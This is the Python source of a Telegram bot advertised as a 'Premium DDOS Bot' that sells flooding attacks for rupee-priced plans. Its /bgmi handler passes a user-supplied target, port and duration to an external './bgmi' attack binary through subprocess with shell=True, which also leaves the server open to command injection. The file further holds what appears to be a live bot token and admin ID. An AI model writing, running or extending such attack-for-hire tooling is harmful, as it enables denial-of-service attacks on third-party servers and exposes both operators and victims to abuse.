import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7456621495:AAFis7aKTDQR6kHV0AgMIWVqJesYaKKz4Dw')

# Admin user IDs (update with actual admin IDs)
admin_id = {"6512242172", "ADMIN_ID_2", "ADMIN_ID_3"}

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Global dictionary for tracking daily attack counts for each user.
# Structure: { user_id: {"date": date_object, "count": int} }
daily_attack_counts = {}

# Function to log commands to file
def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"<b>User:</b> {username}\n"
                   f"<b>Target:</b> {target}\n"
                   f"<b>Port:</b> {port}\n"
                   f"<b>Duration:</b> {duration}\n"
                   f"<b>Time:</b> {datetime.datetime.now()}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "<b>Logs are already spotless!</b>"
            else:
                file.truncate(0)
                return "<b>Logs cleared successfully!</b>"
    except FileNotFoundError:
        return "<b>No logs found!</b>"

# Function to record command logs (detailed log)
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"<b>UserID:</b> {user_id} | <b>Time:</b> {datetime.datetime.now()} | <b>Command:</b> {command}"
    if target:
        log_entry += f" | <b>Target:</b> {target}"
    if port:
        log_entry += f" | <b>Port:</b> {port}"
    if duration:
        log_entry += f" | <b>Duration:</b> {duration}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ==================== ADMIN COMMANDS ====================

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"<b>Success:</b> User <code>{user_to_add}</code> has been added to the elite squad!"
            else:
                response = f"<b>Notice:</b> User <code>{user_to_add}</code> is already in the VIP list."
        else:
            response = "<b>Error:</b> Please provide a new user ID. Usage: <code>/add &lt;userId&gt;</code>"
    else:
        response = "<b>Error:</b> Only top-tier admins can run this command."
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"<b>Success:</b> User <code>{user_to_remove}</code> has been removed from the elite squad!"
            else:
                response = f"<b>Error:</b> User <code>{user_to_remove}</code> is not in the VIP list."
        else:
            response = "<b>Error:</b> Please specify a user ID to remove. Usage: <code>/remove &lt;userId&gt;</code>"
    else:
        response = "<b>Error:</b> Only top-tier admins can run this command."
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "<b>Error:</b> You are not authorized to clear logs."
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "<b>Authorized Users:</b><br>"
                    for uid in user_ids:
                        try:
                            user_info = bot.get_chat(int(uid))
                            username = user_info.username
                            response += f"- @{username} (ID: {uid})<br>"
                        except Exception:
                            response += f"- User ID: {uid}<br>"
                else:
                    response = "<b>No users found.</b>"
        except FileNotFoundError:
            response = "<b>No users found.</b>"
    else:
        response = "<b>Error:</b> You are not authorized to view this."
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
                return
            except FileNotFoundError:
                response = "<b>Error:</b> No logs found."
        else:
            response = "<b>Error:</b> No logs found."
    else:
        response = "<b>Error:</b> You are not authorized to view logs."
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "<b>Your Command Logs:</b><br>" + "".join(user_logs).replace("\n", "<br>")
                else:
                    response = "<b>No logs found for you.</b>"
        except FileNotFoundError:
            response = "<b>Error:</b> Log file not found."
    else:
        response = "<b>Error:</b> You are not authorized to view logs."
    bot.reply_to(message, response, parse_mode="HTML")

# ==================== GENERAL COMMANDS ====================

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"<b>Your ID:</b> {user_id}"
    bot.reply_to(message, response, parse_mode="HTML")

# Function to send a premium-style attack start reply
def start_attack_reply(message, target, port, duration):
    response = (
        "<b>🔥 PREMIUM ATTACK INITIATED 🔥</b><br><br>"
        f"<b>Target:</b> {target}<br>"
        f"<b>Port:</b> {port}<br>"
        f"<b>Duration:</b> {duration} seconds<br><br>"
        "<b>Owner:</b> <a href='https://t.me/offx_sahil'>@offx_sahil</a><br>"
        "<b>Channel:</b> <a href='https://t.me/Kasukabe1'>@Kasukabe1</a><br>"
        "<b>Group:</b> <a href='https://t.me/kasukabe0'>@kasukabe0</a><br><br>"
        "<i>Let the chaos begin! Enjoy your PREMIUM experience!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

# Handler for /bgmi command (attack command)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    # Check if user is allowed
    if user_id not in allowed_user_ids:
        response = "<b>Error:</b> You are not authorized to use this command."
        bot.reply_to(message, response, parse_mode="HTML")
        return

    # ----------------- Daily Limit Check for Normal Users -----------------
    if user_id not in admin_id:
        today = datetime.date.today()
        user_data = daily_attack_counts.get(user_id, {"date": today, "count": 0})
        # Reset count if the date has changed
        if user_data["date"] != today:
            user_data = {"date": today, "count": 0}
        if user_data["count"] >= 10:
            response = ("<b>Daily Limit Reached!</b><br>"
                        "You have already executed 10 premium attacks today.<br>"
                        "Please come back tomorrow for more mayhem!")
            bot.reply_to(message, response, parse_mode="HTML")
            return
        else:
            user_data["count"] += 1
            daily_attack_counts[user_id] = user_data

    # ----------------- Command Parameter Parsing -----------------
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            duration = int(command[3])
        except ValueError:
            response = "<b>Error:</b> Invalid parameters!<br>Usage: <code>/bgmi &lt;target&gt; &lt;port&gt; &lt;duration&gt;</code>"
            bot.reply_to(message, response, parse_mode="HTML")
            return

        if duration > 121:
            response = "<b>Error:</b> Maximum allowed duration is 121 seconds!"
            bot.reply_to(message, response, parse_mode="HTML")
            return

        # Record the command logs
        record_command_logs(user_id, '/bgmi', target, port, duration)
        log_command(user_id, target, port, duration)

        # Reply with premium attack message
        start_attack_reply(message, target, port, duration)

        # Execute the attack command (ensure your system and script 'bgmi' are secure!)
        full_command = f"./bgmi {target} {port} {duration} 800"
        subprocess.run(full_command, shell=True)

        response = (
            "<b>Attack Launched Successfully!</b><br><br>"
            f"<b>Target:</b> {target}:{port}<br>"
            f"<b>Duration:</b> {duration} seconds<br><br>"
            "<b>Owner:</b> <a href='https://t.me/offx_sahil'>@offx_sahil</a><br>"
            "<b>Channel:</b> <a href='https://t.me/Kasukabe1'>@Kasukabe1</a><br>"
            "<b>Group:</b> <a href='https://t.me/kasukabe0'>@kasukabe0</a>"
        )
    else:
        response = ("<b>Error:</b> Invalid usage!<br><br>"
                    "Correct Usage: <code>/bgmi &lt;target&gt; &lt;port&gt; &lt;duration&gt;</code><br>"
                    "Get ready for the mayhem!")
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "<b>PREMIUM DDOS BOT HELP</b><br><br>"
        "<b>Available Commands:</b><br>"
        "• <code>/bgmi &lt;target&gt; &lt;port&gt; &lt;duration&gt;</code> - Launch a premium attack<br>"
        "• <b>/id</b> - Get your user ID<br>"
        "• <b>/mylogs</b> - View your command logs<br>"
        "• <b>/rules</b> - Read the usage rules<br>"
        "• <b>/plan</b> - Check out our pricing plans<br><br>"
        "<b>Admin Commands (VIP Only):</b><br>"
        "• <code>/add &lt;userId&gt;</code> - Add a new user<br>"
        "• <code>/remove &lt;userId&gt;</code> - Remove a user<br>"
        "• <b>/allusers</b> - Show all authorized users<br>"
        "• <b>/logs</b> - Show all logs<br>"
        "• <b>/clearlogs</b> - Clear log file<br><br>"
        "Owner: <a href='https://t.me/offx_sahil'>@offx_sahil</a><br>"
        "Channel: <a href='https://t.me/Kasukabe1'>@Kasukabe1</a><br>"
        "Group: <a href='https://t.me/kasukabe0'>@kasukabe0</a><br><br>"
        "<i>Enjoy your PREMIUM experience and let the chaos begin!</i>"
    )
    bot.reply_to(message, help_text, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    response = (
        "<b>Welcome to the Premium DDOS Bot!</b><br><br>"
        "Use <b>/help</b> to see the available commands.<br><br>"
        "Owner: <a href='https://t.me/offx_sahil'>@offx_sahil</a><br>"
        "Channel: <a href='https://t.me/Kasukabe1'>@Kasukabe1</a><br>"
        "Group: <a href='https://t.me/kasukabe0'>@kasukabe0</a><br><br>"
        "Let's make some digital noise!"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = (
        f"<b>Hey {user_name}, here are the rules for a wild ride:</b><br><br>"
        "1. Don't spam commands – keep it classy!<br>"
        "2. Use the bot responsibly and have fun!<br>"
        "3. Remember: Chaos is best enjoyed in moderation!<br><br>"
        "<i>Enjoy your PREMIUM experience!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = (
        f"<b>Hey {user_name}, check out our premium plans:</b><br><br>"
        "<b>VIP Plan:</b><br>"
        "→ Attack Duration: Up to 300 seconds<br>"
        "→ Cooldown: 1 minute after each attack<br>"
        "→ Concurrent Attacks: 10<br><br>"
        "<b>Pricing:</b><br>"
        "• One Day: 100 Rs<br>"
        "• One Week: 500 Rs<br>"
        "• One Month: 1500 Rs<br><br>"
        "For purchases, contact the owner: <a href='https://t.me/offx_sahil'>@offx_sahil</a><br><br>"
        "Let's turn up the heat!"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = (
        f"<b>Hey {user_name}, here are your ADMIN (VIP) commands:</b><br><br>"
        "• <code>/add &lt;userId&gt;</code>    - Add a new user<br>"
        "• <code>/remove &lt;userId&gt;</code> - Remove a user<br>"
        "• <b>/allusers</b>        - Show all authorized users<br>"
        "• <b>/logs</b>            - Show all logs<br>"
        "• <b>/clearlogs</b>       - Clear log file<br><br>"
        "For further assistance, contact the owner: <a href='https://t.me/offx_sahil'>@offx_sahil</a><br><br>"
        "<i>Enjoy your exclusive PREMIUM access!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

# Start the bot (with error handling)
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        